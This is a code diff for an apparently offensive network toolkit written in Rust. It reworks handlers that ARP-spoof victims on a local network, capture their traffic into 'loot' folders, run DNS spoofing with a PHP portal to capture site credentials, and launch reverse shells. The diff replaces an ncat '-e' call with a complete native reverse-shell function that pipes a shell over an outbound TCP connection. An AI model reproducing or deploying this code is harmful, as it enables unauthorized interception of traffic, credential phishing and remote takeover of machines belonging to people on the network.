@@ -828,8 +1520,8 @@ fn handle_mitm_start(root: &Path, args: MitmStartArgs) -> Result<HandlerResult> 
     let gateway = default_gateway_ip().context("determining default gateway for MITM")?;
     let network = network.unwrap_or_else(|| interface_info.network_cidr());
 
-    let _ = kill_process("arpspoof");
-    let _ = kill_process("tcpdump");
+    let _ = stop_arp_spoof();
+    let _ = stop_pcap_capture();
 
     let hosts = scan_local_hosts(&interface_info.name)?;
     let victims: Vec<_> = hosts
@@ -862,7 +1554,7 @@ fn handle_mitm_start(root: &Path, args: MitmStartArgs) -> Result<HandlerResult> 
         .unwrap_or_else(|| "MITM".to_string());
     let pcap_path = build_mitm_pcap_path(root, Some(&loot_label))?;
     let pcap_display = pcap_path.to_string_lossy().to_string();
-    start_tcpdump_capture(&interface_info.name, &pcap_path)?;
+    start_pcap_capture(&interface_info.name, &pcap_path)?;
     let _ = log_mac_usage(
         root,
         &interface_info.name,
@@ -1070,11 +1762,11 @@ fn handle_eth_site_cred_capture(root: &Path, args: EthernetSiteCredArgs) -> Resu
     fs::create_dir_all(&dns_capture_dir).ok();
 
     // Clean slate
-    let _ = kill_process("arpspoof");
-    let _ = kill_process("tcpdump");
+    let _ = stop_arp_spoof();
+    let _ = stop_pcap_capture();
     let _ = kill_process_pattern("php -S 0.0.0.0:80");
     let _ = kill_process_pattern("php");
-    let _ = kill_process_pattern("ettercap");
+    let _ = stop_dns_spoof();
 
     enable_ip_forwarding(true)?;
 
@@ -1086,12 +1778,11 @@ fn handle_eth_site_cred_capture(root: &Path, args: EthernetSiteCredArgs) -> Resu
         spawn_arpspoof_pair(&interface_info.name, gateway, host)?;
     }
 
-    start_tcpdump_capture(&interface_info.name, &pcap_path)?;
+    start_pcap_capture(&interface_info.name, &pcap_path)?;
 
     // Start DNS spoof + portal
-    rewrite_ettercap_dns(interface_info.address)?;
     start_php_server(&site_dir, Some(&dns_capture_dir))?;
-    start_ettercap(&interface_info.name)?;
+    start_dns_spoof(&interface_info.name, interface_info.address, interface_info.address)?;
     let _ = log_mac_usage(
         root,
         &interface_info.name,
@@ -1134,8 +1825,8 @@ fn handle_eth_site_cred_capture(root: &Path, args: EthernetSiteCredArgs) -> Resu
 }
 
 fn handle_mitm_stop() -> Result<HandlerResult> {
-    let _ = kill_process("arpspoof");
-    let _ = kill_process("tcpdump");
+    let _ = stop_arp_spoof();
+    let _ = stop_pcap_capture();
     enable_ip_forwarding(false)?;
 
     let data = json!({ "stopped": true });
@@ -1155,7 +1846,7 @@ fn handle_dnsspoof_start(root: &Path, args: DnsSpoofStartArgs) -> Result<Handler
     }
 
     let _ = kill_process_pattern("php -S 0.0.0.0:80");
-    let _ = kill_process_pattern("ettercap");
+    let _ = stop_dns_spoof();
 
     let capture_dir = if let Some(dir) = loot_dir {
         let base = dir.join(&site);
@@ -1167,9 +1858,8 @@ fn handle_dnsspoof_start(root: &Path, args: DnsSpoofStartArgs) -> Result<Handler
         base
     };
 
-    rewrite_ettercap_dns(interface_info.address)?;
     start_php_server(&site_dir, Some(&capture_dir))?;
-    start_ettercap(&interface_info.name)?;
+    start_dns_spoof(&interface_info.name, interface_info.address, interface_info.address)?;
     let _ = log_mac_usage(
         root,
         &interface_info.name,
@@ -1188,7 +1878,7 @@ fn handle_dnsspoof_start(root: &Path, args: DnsSpoofStartArgs) -> Result<Handler
 fn handle_dnsspoof_stop() -> Result<HandlerResult> {
     let _ = kill_process_pattern("php -S 0.0.0.0:80");
     let _ = kill_process_pattern("php");
-    let _ = kill_process_pattern("ettercap");
+    let _ = stop_dns_spoof();
     let data = json!({ "stopped": true });
     Ok(("DNS spoofing stopped".to_string(), data))
 }
@@ -1512,23 +2202,14 @@ fn handle_process_status(args: ProcessStatusArgs) -> Result<HandlerResult> {
 }
 
 fn handle_status_summary() -> Result<HandlerResult> {
-    let scan_running = process_running_exact("nmap")?;
-    let mitm_running = process_running_exact("tcpdump")? || process_running_exact("arpspoof")?;
-    let dnsspoof_running = process_running_exact("ettercap")?;
-    let responder_running = process_running_pattern("Responder.py")?;
+    let mitm_running = pcap_capture_running() || arp_spoof_running();
+    let dnsspoof_running = dns_spoof_running();
 
-    let status_text = compose_status_text(
-        scan_running,
-        mitm_running,
-        dnsspoof_running,
-        responder_running,
-    );
+    let status_text = compose_status_text(mitm_running, dnsspoof_running);
 
     let data = json!({
-        "scan_running": scan_running,
         "mitm_running": mitm_running,
         "dnsspoof_running": dnsspoof_running,
-        "responder_running": responder_running,
         "status_text": status_text,
     });
 
@@ -1584,18 +2265,8 @@ fn handle_reverse_launch(root: &Path, args: ReverseLaunchArgs) -> Result<Handler
     } = args;
 
     let interface_info = detect_interface(interface)?;
-    let mut cmd = std::process::Command::new("ncat");
-    cmd.arg(&target)
-        .arg(port.to_string())
-        .arg("-e")
-        .arg(&shell)
-        .stdin(std::process::Stdio::null())
-        .stdout(std::process::Stdio::null())
-        .stderr(std::process::Stdio::null())
-        .arg("-s")
-        .arg(interface_info.address.to_string());
-
-    let child = cmd.spawn().context("launching ncat reverse shell")?;
+    let pid = spawn_reverse_shell(&target, port, &shell, interface_info.address)
+        .context("launching reverse shell")?;
 
     let log_entry = format!(
         "[{}] reverse-shell -> {}:{} via {} (pid {})",
@@ -1603,7 +2274,7 @@ fn handle_reverse_launch(root: &Path, args: ReverseLaunchArgs) -> Result<Handler
         target,
         port,
         interface_info.name,
-        child.id(),
+        pid,
     );
     let _ = append_payload_log(root, &log_entry);
 
@@ -1611,10 +2282,78 @@ fn handle_reverse_launch(root: &Path, args: ReverseLaunchArgs) -> Result<Handler
         "target": target,
         "port": port,
         "interface": interface_info.name,
-        "pid": child.id(),
+        "pid": pid,
         "shell": shell,
     });
     Ok(("Reverse shell launched".to_string(), data))
+}
+
+fn spawn_reverse_shell(
+    target: &str,
+    port: u16,
+    shell: &str,
+    source_ip: Ipv4Addr,
+) -> Result<u32> {
+    let addr = resolve_target_ipv4(target, port)?;
+    let mut stream = connect_tcp_with_source(addr, Some(source_ip), Duration::from_secs(10))
+        .with_context(|| format!("connecting to {}:{} from {}", target, port, source_ip))?;
+    stream.set_nodelay(true).ok();
+
+    let (program, args) = parse_shell_command(shell)?;
+    let mut child = Command::new(program)
+        .args(args)
+        .stdin(std::process::Stdio::piped())
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::piped())
+        .spawn()
+        .context("spawning shell process")?;
+
+    let pid = child.id();
+    let mut child_stdin = child.stdin.take().context("opening shell stdin")?;
+    let mut child_stdout = child.stdout.take().context("opening shell stdout")?;
+    let mut child_stderr = child.stderr.take().context("opening shell stderr")?;
+
+    let mut stream_in = stream
+        .try_clone()
+        .context("cloning stream for stdin")?;
+    let mut stream_out = stream
+        .try_clone()
+        .context("cloning stream for stdout")?;
+
+    std::thread::spawn(move || {
+        let _ = std::io::copy(&mut stream_in, &mut child_stdin);
+    });
+    std::thread::spawn(move || {
+        let _ = std::io::copy(&mut child_stdout, &mut stream_out);
+    });
+    std::thread::spawn(move || {
+        let _ = std::io::copy(&mut child_stderr, &mut stream);
+    });
+    std::thread::spawn(move || {
+        let _ = child.wait();
+    });
+
+    Ok(pid)
+}
+
+fn resolve_target_ipv4(target: &str, port: u16) -> Result<SocketAddr> {
+    if let Ok(ip) = target.parse::<Ipv4Addr>() {
+        return Ok(SocketAddr::new(ip.into(), port));
+    }
+    let mut addrs = (target, port)
+        .to_socket_addrs()
+        .with_context(|| format!("resolving {}", target))?;
+    addrs
+        .find(|addr| matches!(addr, SocketAddr::V4(_)))
+        .ok_or_else(|| anyhow!("no IPv4 address resolved for {}", target))
+}
+
+fn parse_shell_command(shell: &str) -> Result<(String, Vec<String>)> {
+    let mut parts = shell.split_whitespace();
+    let program = parts
+        .next()
+        .ok_or_else(|| anyhow!("shell command cannot be empty"))?;
+    Ok((program.to_string(), parts.map(|s| s.to_string()).collect()))
 }
 
 fn handle_wifi_list() -> Result<HandlerResult> {
@@ -2128,7 +2867,7 @@ fn handle_bridge_start(root: &Path, args: BridgeStartArgs) -> Result<HandlerResu
             pcap_path.to_string_lossy()
         ),
     );
-    start_tcpdump_capture("br0", &pcap_path)?;
+    start_pcap_capture("br0", &pcap_path)?;
     let data = json!({
         "bridge": "br0",
         "interfaces": [args.interface_a, args.interface_b],
@@ -2139,7 +2878,7 @@ fn handle_bridge_start(root: &Path, args: BridgeStartArgs) -> Result<HandlerResu
 }
 
 fn handle_bridge_stop(root: &Path, args: BridgeStopArgs) -> Result<HandlerResult> {
-    let _ = kill_process("tcpdump");
+    let _ = stop_pcap_capture();
     stop_bridge_pair(&args.interface_a, &args.interface_b)?;
     if let Err(err) = restore_routing_state(root) {
         log::warn!("bridge stop: failed to restore routing: {err}");
@@ -3328,8 +4067,7 @@ fn wireless_tag(ssid: Option<&str>, bssid: Option<&str>, interface: &str) -> Str
 
 fn loot_directory(root: &Path, kind: LootKind) -> PathBuf {
     match kind {
-        LootKind::Nmap => root.join("loot").join("Nmap"),
-        LootKind::Responder => root.join("Responder").join("logs"),
+        LootKind::Scan => root.join("loot").join("Scan"),
         LootKind::Dnsspoof => root.join("DNSSpoof").join("captures"),
         LootKind::Ethernet => root.join("loot").join("Ethernet"),
         LootKind::Wireless => root.join("loot").join("Wireless"),
@@ -3457,8 +4195,7 @@ fn wireless_target_directory(root: &Path, ssid: Option<String>, bssid: Option<St
 
 fn loot_kind_label(kind: LootKind) -> &'static str {
     match kind {
-        LootKind::Nmap => "nmap",
-        LootKind::Responder => "responder",
+        LootKind::Scan => "scan",
         LootKind::Dnsspoof => "dnsspoof",
         LootKind::Ethernet => "ethernet",
         LootKind::Wireless => "wireless",
